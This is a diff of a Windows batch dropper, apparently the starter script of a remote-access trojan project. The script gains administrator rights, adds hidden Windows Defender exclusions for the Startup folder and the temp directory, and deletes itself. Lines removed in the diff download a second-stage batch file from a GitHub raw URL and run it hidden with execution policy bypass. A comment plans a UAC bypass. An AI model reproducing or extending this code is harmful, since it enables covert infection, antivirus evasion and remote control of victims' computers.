@@ -1,10 +1,8 @@
 @REM TODO: add UAC bypass
-
+@echo off
 @REM change me
 set "username=saifa"
-@echo off
-:: BatchGotAdmin
-:-------------------------------------
+set "currentd=%cd%"
 if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
 ) else (
@@ -26,8 +24,6 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
-powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
-timeout 5
-powershell -windowstyle hidden -ep bypass ./secondary.bat
+powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
 del Starter.bat
